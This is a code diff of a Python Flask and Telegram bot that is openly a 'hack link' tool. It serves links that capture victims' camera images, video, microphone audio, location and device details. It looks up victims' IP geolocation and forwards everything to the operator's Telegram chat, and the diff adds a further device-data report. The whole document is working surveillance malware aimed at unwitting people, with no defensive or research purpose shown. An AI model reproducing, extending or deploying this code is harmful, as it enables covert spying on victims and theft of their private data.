@@ -25,11 +25,11 @@ channel_id = '@hackerpdfbotlog'
 
 
 user_id = 1853412532
-host = "https://telejack.onrender.com/"
+host = "https://telejack.onrender.com"
 
 
 info = f"""* ‼️ hack link list *\n
-*{host} - basic for devise info *
+*{host}/ - basic for devise info *
 *{host}/cam -cam hack*
 *{host}/loc - location info*
 *{host}/video - cam hack with videos*
@@ -65,13 +65,6 @@ def message(message):
 message("hacker is online ")
 message(info)
 
-
-
-def video(file):
-    try:
-      bot.send_video(user_id, file)
-    except Exception as e:
-        print(f"error video sending {str(e)}")
        
 
 @bot.message_handler(commands=['start'])
@@ -91,7 +84,7 @@ def send_welcome(message):
 
 
 def ipdata(ip):
-    data = requests.get(f"http://ip-api.com/json/{ip}")
+    data = requests.get(f"http://ip-api.com/json/{ip}?status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query")
     return data.json()
 
 
@@ -185,7 +178,7 @@ def micdata():
     data = request.get_json()
     image_data = data['audio']
     global file
-    print("photo")
+    print("send photo")
     decoded_image_data = base64.b64decode(image_data)
 #    file = f"data/{ran()}.jpg"
     time = now()
@@ -227,8 +220,24 @@ def upload_image():
 def devi():
     data = request.get_json()
     io = jdata(data)
+    Alldata = f""" ``` bassic info
+    \n
+   * device :-  {data['userAgent']} / {data['browserVersion']}*   
+    language :- {data['language']}
+    ram :- {data['deviceMemory']}
+    timeZone:- {data['timeZone']}
+    network :- {data["effectiveConnectionType"]}```
+    
+    \n
+    
+    """
+    message(Alldata)
     m = f""" user device data info\n
-    ```
+   
+    
+    
+    
+    ```json data
     {io}
     ```
     """
@@ -268,7 +277,6 @@ def ser():
 
 
 if __name__ == '__main__':
-    # Start Flask app in a new thread
     
     
     flask_thread = threading.Thread(target=ser)
